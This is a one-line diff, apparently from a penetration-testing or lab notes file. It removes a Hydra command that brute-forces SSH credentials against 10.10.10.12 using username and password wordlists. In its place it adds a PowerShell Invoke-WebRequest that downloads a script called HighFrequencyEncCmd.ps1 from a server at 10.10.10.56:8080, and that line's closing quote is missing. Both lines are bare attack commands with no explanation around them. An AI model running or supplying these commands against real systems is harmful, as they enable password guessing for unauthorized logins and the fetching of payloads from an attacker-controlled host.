@@ -1,1 +1,1 @@
-hydra -L '/root/Wordlist/userlist.txt' -P '/root/Wordlist/pass.txt' 10.10.10.12 ssh -t 4
+Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.56:8080/HighFrequencyEncCmd.ps1" -OutFile "highfrequencyEncCmd.ps1
